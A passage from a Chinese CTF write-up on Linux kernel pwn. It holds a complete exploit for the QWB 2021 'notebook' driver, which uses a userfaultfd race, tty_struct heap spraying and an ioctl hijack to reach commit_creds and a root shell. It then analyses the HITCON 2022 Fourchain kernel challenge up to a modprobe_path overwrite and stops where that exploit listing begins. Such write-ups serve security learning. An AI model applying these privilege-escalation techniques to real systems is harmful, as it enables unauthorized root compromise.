class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-type">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">proc_fops</span>;</span><br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x100</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x200</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x300</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">100</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-type">pthread_t</span> monitor_thread;<br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, (<span class="hljs-type">void</span> * (*)(<span class="hljs-type">void</span> *))handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">int</span> page_size=sysconf(_SC_PAGESIZE);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd Start!\e[0m\n&quot;</span>);<br>        <br>        <span class="hljs-comment">/*stop to do what?*/</span><br>        sleep(<span class="hljs-number">100</span>);<br>        <span class="hljs-comment">/**/</span><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd done!\e[0m\n&quot;</span>);<br>        <span class="hljs-comment">//cnt++;</span><br><br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_edit</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    sem_wait(&amp;sem_edit);<br>    edit((<span class="hljs-type">int</span>)args,<span class="hljs-number">0x2000</span>,buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_add</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    sem_wait(&amp;sem_add);<br>    add((<span class="hljs-type">int</span>)args,<span class="hljs-number">0x50</span>,buf);<br>&#125;<br><br><br><span class="hljs-type">pthread_t</span> <span class="hljs-type">edit_t</span>,<span class="hljs-type">add_t</span>;<br><span class="hljs-type">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> tty_idx,hit_tty;<br><span class="hljs-type">int</span> fake_tty_ops_idx=<span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> fake_stack_idx=<span class="hljs-number">-1</span>;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> pwn_cpu;<br>CPU_ZERO(&amp;pwn_cpu);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;pwn_cpu);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    sem_init(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    saveStatus();<br>    note_fd=open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span> (note_fd==<span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fuck notebook&quot;</span>);<br>    buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    registerUserFaultFd(buf,<span class="hljs-number">0x4000</span>,fault_handler_thread);<br>    <br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        add(i,<span class="hljs-number">0x60</span>,page);<br>        edit(i,TTY_STRUCT_SIZE,page);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        pthread_create(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evil_edit,(<span class="hljs-type">void</span>*)i);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] All threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <br><br>    <span class="hljs-comment">// heap spraying ---&gt; tty_struct</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x100</span>;i++)&#123;<br>        tty_fd[i]=open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>,O_RDWR);<br>        <span class="hljs-keyword">if</span> (tty_fd[i]==<span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;fuck tty&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        pthread_create(&amp;<span class="hljs-type">add_t</span>, <span class="hljs-literal">NULL</span>, evil_add,(<span class="hljs-type">void</span>*)i);<br>    &#125; <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] All threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <span class="hljs-comment">//check tty_magic 0x5401</span><br>    <br>    gift((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; max_spray_times; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-comment">//printf(&quot;%llx\n&quot;,*((int*)tty_data));</span><br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-type">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    <span class="hljs-comment">//leak kernel_base by tty</span><br>    tty_ops = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)kernel_base + kernel_offset);<br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Kernel offset: 0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel base: %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] prepare_kernel_cred: 0x%llx\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] commit_creds: %p\n&quot;</span>, commit_creds);<br><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-type">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;Unable to find a note,try again&quot;</span>);<br><br>    <span class="hljs-comment">//fit size</span><br>    edit(fake_tty_ops_idx,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations),fake_tty_data);<br>    gift((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <br>    <span class="hljs-comment">//hijack   tty_ops-&gt;ioctl=work_for_cpu_fn</span><br>    ((<span class="hljs-keyword">struct</span> tty_operations*)fake_tty_ops_data)-&gt;ioctl=work_for_cpu_fn+kernel_offset;<br>    write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);<br><br>    <span class="hljs-comment">//copy the tty_data to fake_tty_data</span><br>    read(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">0x6</span>);<br><br>    <span class="hljs-comment">// set params in fake tty_struct</span><br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = prepare_kernel_cred;<br>    fake_tty_data[<span class="hljs-number">5</span>] = <span class="hljs-literal">NULL</span>;<br>    write(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">//ioctl trigger--&gt;prepare_kernel_cred(0)</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start prepare_kernel_cred(0)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; max_spray_times; i++)<br>        ioctl(tty_fd[i], <span class="hljs-number">0xdead</span>, <span class="hljs-number">0xdead</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    sleep(<span class="hljs-number">1</span>);<br><br>    read(note_fd, fake_tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">6</span>);<br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = commit_creds;<br>    fake_tty_data[<span class="hljs-number">5</span>] = fake_tty_data[<span class="hljs-number">6</span>];<br>    write(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">//ioctl trigger--&gt;commit_creds(prepare_kernel_cred(0))</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start commit_creds(ROOT)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; max_spray_times; i++)<br>        ioctl(tty_fd[i], <span class="hljs-number">0xdead</span>, <span class="hljs-number">0xdead</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    getRootShell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然而我自己实测下来，依旧不太稳定，仍会kernel panic，或提权失败</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/13.png" alt="13"></p><h4 id="0x4参考">0x4参考</h4><p><a href="https://www.anquanke.com/post/id/253835#h2-6">从强网杯 2021 线上赛题目 notebook 中浅析 userfaultfd 在 kernel pwn 中的利用-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/385645268">第五届强网杯线上赛冠军队 WriteUp - Pwn 篇 - 知乎 (zhihu.com)</a></p><h3 id="2022HITCONCTF⛓️-Fourchain-Kernel：">2022HITCONCTF⛓️ Fourchain - Kernel：</h3><p>此题是2022HITCONCTF中的fourchain中的kernel,比赛时做不出来，想要复现来着，结果拖了好久</p><p>解法参照的是日本师傅ptr-yudai ，并对照着<a href="https://nightu.darkflow.top/posts/a60d8e49.html#%E2%9B%93%EF%B8%8F-Fourchain-Kernel">夜悠师傅</a>的blog来理解的  (tql!!!)</p><p>这算是一种非预期的解法，相对来说更简便一些</p><h4 id="0x1分析-2">0x1分析:</h4><p>题目给出了漏洞驱动<code>note2.ko</code>的源码，源码就不分析了，就挑几个重点说一下</p><p>没有加锁之类的操作，所以存在条件竞争的可能</p><p>有两个结构体，这个<code>node</code>结构体，是用来维护的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint64_t</span> key;<span class="hljs-comment">//存放的随机值，用于异或加密</span><br><span class="hljs-type">uint64_t</span> size;<span class="hljs-comment">//我们传入的size</span><br><span class="hljs-type">uint64_t</span> addr;<span class="hljs-comment">//存放申请可控大小内存的指针</span><br>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">table</span>[0<span class="hljs-title">x10</span>];</span><br></code></pre></td></tr></table></figure><p>add时会固定申请<code>sizeof(struct node)</code>大小也就是0x18给它</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">table[data.idx] = (<span class="hljs-keyword">struct</span> node*)kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> node),GFP_KERNEL);<br></code></pre></td></tr></table></figure><p>另一个结构体data，是我们传参数时的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ioctl_arg</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint64_t</span> idx;<br><span class="hljs-type">uint64_t</span> size;<br><span class="hljs-type">uint64_t</span> addr;<br>&#125;;<br></code></pre></td></tr></table></figure><p>add时会根据我们传入的size来分配可控大小的内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">addr = (<span class="hljs-type">uint64_t</span>)kzalloc(data.size,GFP_KERNEL);<br></code></pre></td></tr></table></figure><p>假设我们第一次add(0x18)大小,分配内存的大小如下:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">node</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span><br><span class="hljs-function"><span class="hljs-title">data</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span><br></code></pre></td></tr></table></figure><p>我们free掉上面的，再add不等同与0x18大小的内存，例如add(0x30),会申请到如下内存:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">node</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>-----&gt;这个内存是从上面free掉的<span class="hljs-built_in">node</span>(<span class="hljs-number">0</span>x18)中取来的<br><span class="hljs-function"><span class="hljs-title">data</span><span class="hljs-params">(<span class="hljs-number">0</span>x30)</span></span><br></code></pre></td></tr></table></figure><p>我们再次add不等同与0x18大小的内存，例如add(0x30),会申请到如下内存:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">node</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>-----&gt;这个内存是从上面free掉的<span class="hljs-built_in">data</span>(<span class="hljs-number">0</span>x18)中取来的,data是我们可控的，addr指针就被我们控制了，可以AAR/AAW<br><span class="hljs-function"><span class="hljs-title">data</span><span class="hljs-params">(<span class="hljs-number">0</span>x30)</span></span><br></code></pre></td></tr></table></figure><p>(大致思想就是这样，在用户态的堆利用中也有这种思路)</p><h4 id="0x2解法Hijack-node-to-AAR-AAW-modprobe-path：">0x2解法Hijack node to AAR/AAW+modprobe_path：</h4><p><strong>AAR/AAW</strong>(即任意地址读取任意值/任意地址写任意值)</p><p>接下来是<strong>大致步骤</strong></p><p>1.在edit(0x18)时用userfaultfd断下，用在userfaultfd线程完成上述操作，达到AAR(任意读)泄露内核基址,得到modprobe_path地址</p><p>2.故技重施AAW(任意写)，劫持modprobe_path,以root权限执行某个文件提权到root</p><p>细节还是看exp吧</p><h4 id="0x3Exp：">0x3Exp：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 